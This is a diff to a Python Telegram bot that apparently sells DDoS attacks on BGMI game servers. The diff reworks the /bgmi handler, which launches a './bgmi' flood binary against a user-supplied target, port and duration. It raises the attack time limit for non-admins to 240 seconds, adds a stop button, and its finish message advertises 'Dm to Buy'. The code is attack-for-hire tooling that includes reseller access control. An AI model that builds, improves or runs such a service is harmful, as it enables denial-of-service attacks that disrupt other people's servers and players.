@@ -409,6 +409,11 @@ def initialize_bot(bot, bot_id):
     def start_attack_reply(message, target, port, time):
         user_info = message.from_user
         username = user_info.username if user_info.username else user_info.first_name
+        global Attack
+        full_command = ['./bgmi', str(target), str(port), str(time), '900']
+        Attack = subprocess.Popen(full_command)
+        scheduled_time = datetime.now() + timedelta(seconds=time)
+        Thread(target=finish_message, args=(message, target, port, time, owner_name, scheduled_time)).start()
         markup = InlineKeyboardMarkup()
         markup.add(InlineKeyboardButton("STOP Attack", callback_data="stop_attack"))
         response = f"@{username}, 𝐀𝐓𝐓𝐀𝐂𝐊 𝐒𝐓𝐀𝐑𝐓𝐄𝐃.🔥🔥\n\n𝐓𝐚𝐫𝐠𝐞𝐭: {target}\n𝐏𝐨𝐫𝐭: {port}\n𝐓𝐢𝐦𝐞: {time} 𝐒𝐞𝐜𝐨𝐧𝐝𝐬\n𝐌𝐞𝐭𝐡𝐨𝐝: BGMI"
@@ -424,7 +429,6 @@ def initialize_bot(bot, bot_id):
         allowed_admin_ids = read_admins(bot_id)
         allowed_resellers_ids = read_resellers()
         owner_name = get_owner_name(bot_id)
-        global Attack
         if user_id in allowed_user_ids or user_id in allowed_admin_ids or user_id in allowed_resellers_ids:
             if user_id not in allowed_admin_ids:
                 if user_id in bgmi_cooldown and (datetime.now() - bgmi_cooldown[user_id]).seconds < 3:
@@ -437,16 +441,12 @@ def initialize_bot(bot, bot_id):
                 target = command[1]
                 port = int(command[2])
                 time = int(command[3])
-                if user_id not in allowed_admin_ids and time > 180:
-                    response = "Error: Time interval must be less than 180."
+                if user_id not in allowed_admin_ids and time > 240:
+                    response = "Error: Time interval must be less than 240."
                     bot.reply_to(message, response)
                 else:
                     log_command(user_id, target, port, time, '/bgmi')
                     start_attack_reply(message, target, port, time)  
-                    full_command = f"./bgmi {target} {port} {time} 900"
-                    Attack = subprocess.Popen(full_command, shell=True)
-                    scheduled_time = datetime.now() + timedelta(seconds=time)
-                    Thread(target=finish_message, args=(message, target, port, time, owner_name, scheduled_time)).start()
             else:
                 response = "✅ Usage :- /bgmi <target> <port> <time>"
                 bot.reply_to(message, response)
@@ -455,11 +455,13 @@ def initialize_bot(bot, bot_id):
             bot.reply_to(message, response)
 
     def finish_message(message, target, port, attack_time, owner_name, scheduled_time):
+        global Attack
         while datetime.now() < scheduled_time:
             time.sleep(1)
         
-        response = f"☣️BGMI D-DoS Attack Finished.\n\nTarget: {target} Port: {port} Time: {attack_time} Seconds\n\n👛Dm to Buy : {owner_name}"
-        bot.reply_to(message, response)
+        if Attack is not None:
+            response = f"☣️BGMI D-DoS Attack Finished.\n\nTarget: {target} Port: {port} Time: {attack_time} Seconds\n\n👛Dm to Buy : {owner_name}"
+            bot.reply_to(message, response)
     
     @bot.callback_query_handler(func=lambda call: True)
     def handle_callback_query(call):
@@ -467,10 +469,10 @@ def initialize_bot(bot, bot_id):
             global Attack
             if Attack is not None:
                 Attack.terminate()
-                bot.send_message(call.message.chat.id, "Attack stopped successfully.")
+                bot.reply_to(call.message.chat.id, "Attack stopped successfully.")
                 Attack = None
             else:
-                bot.send_message(call.message.chat.id, "No running attacks to be stopped.")
+                bot.reply_to(call.message.chat.id, "No running attacks to be stopped.")
     
     @bot.message_handler(commands=['help'])
     def show_help(message):
